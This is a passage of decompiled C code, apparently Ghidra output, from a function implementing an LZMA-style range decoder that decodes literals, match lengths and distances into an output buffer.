    local_c = local_c + 1;
    iVar4 = iVar4 + -1;
  } while (iVar4 != 0);
LAB_0042576e:
  iVar4 = local_2c;
  uVar9 = local_14 & 3;
  puVar5 = param_3 + local_10 * 0x10 + uVar9;
  pbVar2 = pbVar1;
  if (pbVar1 < (byte *)0x1000000) {
    param_2 = (byte *)((int)param_2 << 8 | (uint)*local_c);
    pbVar2 = (byte *)((int)pbVar1 << 8);
    local_c = local_c + 1;
  }
  uVar10 = *puVar5;
  pbVar1 = (byte *)(((uint)pbVar2 >> 0xb) * uVar10);
  if (param_2 < pbVar1) {
    *puVar5 = (0x800 - uVar10 >> 5) + uVar10;
    iVar4 = 1;
    pbVar2 = pbVar1;
    if (local_10 < 7) goto LAB_00425886;
    local_28 = (uint)*(byte *)(param_1 + (local_14 - local_18));
    do {
      local_28 = local_28 << 1;
      uVar9 = local_28 & 0x100;
      puVar5 = param_3 + (uint)local_5 * 0x300 + iVar4 + uVar9 + 0x836;
      pbVar2 = pbVar1;
      if (pbVar1 < (byte *)0x1000000) {
        param_2 = (byte *)((int)param_2 << 8 | (uint)*local_c);
        pbVar2 = (byte *)((int)pbVar1 << 8);
        local_c = local_c + 1;
      }
      uVar10 = *puVar5;
      pbVar1 = (byte *)(((uint)pbVar2 >> 0xb) * uVar10);
      if (param_2 < pbVar1) {
        iVar4 = iVar4 * 2;
        *puVar5 = (0x800 - uVar10 >> 5) + uVar10;
        if (uVar9 != 0) goto LAB_004258df;
      }
      else {
        param_2 = param_2 + -(int)pbVar1;
        pbVar1 = pbVar2 + -(int)pbVar1;
        *puVar5 = uVar10 - (uVar10 >> 5);
        iVar4 = iVar4 * 2 + 1;
        if (uVar9 == 0) goto LAB_004258df;
      }
    } while (iVar4 < 0x100);
    goto LAB_004258e7;
  }
  param_2 = param_2 + -(int)pbVar1;
  uVar3 = (int)pbVar2 - (int)pbVar1;
  *puVar5 = uVar10 - (uVar10 >> 5);
  puVar5 = param_3 + local_10 + 0xc0;
  if (uVar3 < 0x1000000) {
    param_2 = (byte *)((int)param_2 * 0x100 | (uint)*local_c);
    uVar3 = uVar3 * 0x100;
    local_c = local_c + 1;
  }
  uVar10 = *puVar5;
  pbVar2 = (byte *)((uVar3 >> 0xb) * uVar10);
  if (param_2 < pbVar2) {
    local_2c = local_1c;
    local_1c = local_20;
    *puVar5 = (0x800 - uVar10 >> 5) + uVar10;
    local_20 = local_18;
    if (local_10 < 7) {
      local_10 = 0;
    }
    else {
      local_10 = 3;
    }
    puVar5 = param_3 + 0x332;
  }
  else {
    param_2 = param_2 + -(int)pbVar2;
    uVar3 = uVar3 - (int)pbVar2;
    *puVar5 = uVar10 - (uVar10 >> 5);
    puVar5 = param_3 + local_10 + 0xcc;
    if (uVar3 < 0x1000000) {
      param_2 = (byte *)((int)param_2 * 0x100 | (uint)*local_c);
      uVar3 = uVar3 * 0x100;
      local_c = local_c + 1;
    }
    uVar10 = *puVar5;
    pbVar2 = (byte *)((uVar3 >> 0xb) * uVar10);
    if (param_2 < pbVar2) {
      *puVar5 = (0x800 - uVar10 >> 5) + uVar10;
      puVar5 = param_3 + (local_10 + 0xf) * 0x10 + uVar9;
      if (pbVar2 < (byte *)0x1000000) {
        pbVar2 = (byte *)((int)pbVar2 * 0x100);
        param_2 = (byte *)((int)param_2 << 8 | (uint)*local_c);
        local_c = local_c + 1;
      }
      uVar10 = *puVar5;
      pbVar1 = (byte *)(((uint)pbVar2 >> 0xb) * uVar10);
      if (param_2 < pbVar1) {
        *puVar5 = (0x800 - uVar10 >> 5) + uVar10;
        local_10 = (uint)(6 < local_10) * 2 + 9;
        local_5 = *(byte *)(param_1 + (local_14 - local_18));
        *(byte *)(param_1 + local_14) = local_5;
        local_14 = local_14 + 1;
        goto LAB_0042576e;
      }
      param_2 = param_2 + -(int)pbVar1;
      pbVar2 = pbVar2 + -(int)pbVar1;
      *puVar5 = uVar10 - (uVar10 >> 5);
    }
    else {
      param_2 = param_2 + -(int)pbVar2;
      uVar3 = uVar3 - (int)pbVar2;
      *puVar5 = uVar10 - (uVar10 >> 5);
      puVar5 = param_3 + local_10 + 0xd8;
      if (uVar3 < 0x1000000) {
        param_2 = (byte *)((int)param_2 * 0x100 | (uint)*local_c);
        uVar3 = uVar3 * 0x100;
        local_c = local_c + 1;
      }
      uVar10 = *puVar5;
      pbVar2 = (byte *)((uVar3 >> 0xb) * uVar10);
      if (param_2 < pbVar2) {
        *puVar5 = (0x800 - uVar10 >> 5) + uVar10;
        iVar4 = local_20;
      }
      else {
        param_2 = param_2 + -(int)pbVar2;
        uVar3 = uVar3 - (int)pbVar2;
        *puVar5 = uVar10 - (uVar10 >> 5);
        puVar5 = param_3 + local_10 + 0xe4;
        if (uVar3 < 0x1000000) {
          param_2 = (byte *)((int)param_2 * 0x100 | (uint)*local_c);
          uVar3 = uVar3 * 0x100;
          local_c = local_c + 1;
        }
        uVar10 = *puVar5;
        pbVar2 = (byte *)((uVar3 >> 0xb) * uVar10);
        if (param_2 < pbVar2) {
          *puVar5 = (0x800 - uVar10 >> 5) + uVar10;
          iVar4 = local_1c;
        }
        else {
          param_2 = param_2 + -(int)pbVar2;
          pbVar2 = (byte *)(uVar3 - (int)pbVar2);
          *puVar5 = uVar10 - (uVar10 >> 5);
          local_2c = local_1c;
        }
        local_1c = local_20;
      }
      local_20 = local_18;
      local_18 = iVar4;
    }
    local_10 = ((6 < local_10) - 1 & 0xfffffffd) + 0xb;
    puVar5 = param_3 + 0x534;
  }
  if (pbVar2 < (byte *)0x1000000) {
    param_2 = (byte *)((int)param_2 << 8 | (uint)*local_c);
    pbVar2 = (byte *)((int)pbVar2 << 8);
    local_c = local_c + 1;
  }
  uVar10 = *puVar5;
  pbVar1 = (byte *)(((uint)pbVar2 >> 0xb) * uVar10);
  if (param_2 < pbVar1) {
    local_28 = 0;
    *puVar5 = (0x800 - uVar10 >> 5) + uVar10;
    iVar4 = uVar9 * 8 + 2;
LAB_00425c39:
    puVar5 = puVar5 + iVar4;
    local_24 = 3;
  }
  else {
    param_2 = param_2 + -(int)pbVar1;
    uVar3 = (int)pbVar2 - (int)pbVar1;
    *puVar5 = uVar10 - (uVar10 >> 5);
    if (uVar3 < 0x1000000) {
      param_2 = (byte *)((int)param_2 * 0x100 | (uint)*local_c);
      uVar3 = uVar3 * 0x100;
      local_c = local_c + 1;
    }
    uVar10 = puVar5[1];
    pbVar1 = (byte *)((uVar3 >> 0xb) * uVar10);
    if (param_2 < pbVar1) {
      puVar5[1] = (0x800 - uVar10 >> 5) + uVar10;
      iVar4 = uVar9 * 8 + 0x82;
      local_28 = 8;
      goto LAB_00425c39;
    }
    param_2 = param_2 + -(int)pbVar1;
    pbVar1 = (byte *)(uVar3 - (int)pbVar1);
    puVar5[1] = uVar10 - (uVar10 >> 5);
    puVar5 = puVar5 + 0x102;
    local_28 = 0x10;
    local_24 = 8;
  }
  local_30 = local_24;
  iVar4 = 1;
  do {
    pbVar2 = pbVar1;
    if (pbVar1 < (byte *)0x1000000) {
      param_2 = (byte *)((int)param_2 << 8 | (uint)*local_c);
      pbVar2 = (byte *)((int)pbVar1 << 8);
      local_c = local_c + 1;
    }
    uVar9 = puVar5[iVar4];
    pbVar1 = (byte *)(((uint)pbVar2 >> 0xb) * uVar9);
    if (param_2 < pbVar1) {
      puVar5[iVar4] = (0x800 - uVar9 >> 5) + uVar9;
      iVar4 = iVar4 * 2;
    }
    else {
      param_2 = param_2 + -(int)pbVar1;
      pbVar1 = pbVar2 + -(int)pbVar1;
      puVar5[iVar4] = uVar9 - (uVar9 >> 5);
      iVar4 = iVar4 * 2 + 1;
    }
    local_30 = local_30 + -1;
  } while (local_30 != 0);
  iVar7 = 1;
  iVar4 = iVar4 + (local_28 - (1 << (sbyte)local_24));
  if (local_10 < 4) {
    local_10 = local_10 + 7;
    iVar6 = iVar4;
    if (3 < iVar4) {
      iVar6 = 3;
    }
    local_30 = 6;
    do {
      pbVar2 = pbVar1;
      if (pbVar1 < (byte *)0x1000000) {
        param_2 = (byte *)((int)param_2 << 8 | (uint)*local_c);
        pbVar2 = (byte *)((int)pbVar1 << 8);
        local_c = local_c + 1;
      }
      uVar9 = param_3[iVar6 * 0x40 + iVar7 + 0x1b0];
      pbVar1 = (byte *)(((uint)pbVar2 >> 0xb) * uVar9);
      if (param_2 < pbVar1) {
        param_3[iVar6 * 0x40 + iVar7 + 0x1b0] = (0x800 - uVar9 >> 5) + uVar9;
        iVar7 = iVar7 * 2;
      }
      else {
        param_2 = param_2 + -(int)pbVar1;
        pbVar1 = pbVar2 + -(int)pbVar1;
        param_3[iVar6 * 0x40 + iVar7 + 0x1b0] = uVar9 - (uVar9 >> 5);
        iVar7 = iVar7 * 2 + 1;
      }
      local_30 = local_30 + -1;
    } while (local_30 != 0);
    uVar9 = iVar7 - 0x40;
    if (3 < (int)uVar9) {
      local_18 = ((int)uVar9 >> 1) + -1;
      uVar10 = uVar9 & 1 | 2;
      if ((int)uVar9 < 0xe) {
        uVar10 = uVar10 << ((byte)local_18 & 0x1f);
        puVar8 = param_3 + (uVar10 - uVar9) + 0x2af;
      }
      else {
        iVar7 = ((int)uVar9 >> 1) + -5;
        do {
          if (pbVar1 < (byte *)0x1000000) {
            param_2 = (byte *)((int)param_2 << 8 | (uint)*local_c);
            pbVar1 = (byte *)((int)pbVar1 << 8);
            local_c = local_c + 1;
          }
          pbVar1 = (byte *)((uint)pbVar1 >> 1);
          uVar10 = uVar10 * 2;
          if (pbVar1 <= param_2) {
            param_2 = param_2 + -(int)pbVar1;
            uVar10 = uVar10 | 1;
          }
          iVar7 = iVar7 + -1;
        } while (iVar7 != 0);
        puVar8 = param_3 + 0x322;
        uVar10 = uVar10 << 4;
        local_18 = 4;
      }
      iVar7 = 1;
      local_28 = 1;
      uVar9 = uVar10;
      do {
        pbVar2 = pbVar1;
        if (pbVar1 < (byte *)0x1000000) {
          param_2 = (byte *)((int)param_2 << 8 | (uint)*local_c);
          pbVar2 = (byte *)((int)pbVar1 << 8);
          local_c = local_c + 1;
        }
        uVar10 = puVar8[iVar7];
        pbVar1 = (byte *)(((uint)pbVar2 >> 0xb) * uVar10);
        if (param_2 < pbVar1) {
          puVar8[iVar7] = (0x800 - uVar10 >> 5) + uVar10;
          iVar7 = iVar7 * 2;
        }
        else {
          param_2 = param_2 + -(int)pbVar1;
          pbVar1 = pbVar2 + -(int)pbVar1;
          uVar9 = uVar9 | local_28;
          puVar8[iVar7] = uVar10 - (uVar10 >> 5);
          iVar7 = iVar7 * 2 + 1;
        }
        local_28 = local_28 << 1;
        local_18 = local_18 + -1;
      } while (local_18 != 0);
    }
    local_18 = uVar9 + 1;
    if (local_18 == 0) {
      return local_14;
    }
  }
  iVar4 = iVar4 + 2;
  pbVar2 = (byte *)((local_14 - local_18) + param_1);
  do {
    local_5 = *pbVar2;
    iVar4 = iVar4 + -1;
    uVar9 = local_14 + 1;
    pbVar2 = pbVar2 + 1;
    *(byte *)(param_1 + local_14) = local_5;
    local_14 = uVar9;
  } while (iVar4 != 0);
  goto LAB_0042576e;
LAB_004258df:
  while (pbVar2 = pbVar1, iVar4 < 0x100) {
LAB_00425886:
    puVar5 = param_3 + (uint)local_5 * 0x300 + iVar4 + 0x736;
    if (pbVar2 < (byte *)0x1000000) {
      param_2 = (byte *)((int)param_2 << 8 | (uint)*local_c);
      pbVar2 = (byte *)((int)pbVar2 << 8);
      local_c = local_c + 1;
    }
    uVar9 = *puVar5;
    pbVar1 = (byte *)(((uint)pbVar2 >> 0xb) * uVar9);
    if (param_2 < pbVar1) {
      *puVar5 = (0x800 - uVar9 >> 5) + uVar9;
      iVar4 = iVar4 * 2;
    }
    else {
      param_2 = param_2 + -(int)pbVar1;
      pbVar1 = pbVar2 + -(int)pbVar1;
      *puVar5 = uVar9 - (uVar9 >> 5);
      iVar4 = iVar4 * 2 + 1;
    }
  }
LAB_004258e7:
  uVar9 = local_14 + 1;
  local_5 = (byte)iVar4;
  *(byte *)(param_1 + local_14) = local_5;
  local_14 = uVar9;
  if (local_10 < 4) {
    local_10 = 0;
  }
  else if (local_10 < 10) {
    local_10 = local_10 + -3;
  }
  else {
    local_10 = local_10 + -6;
  }
  goto LAB_0042576e;
}


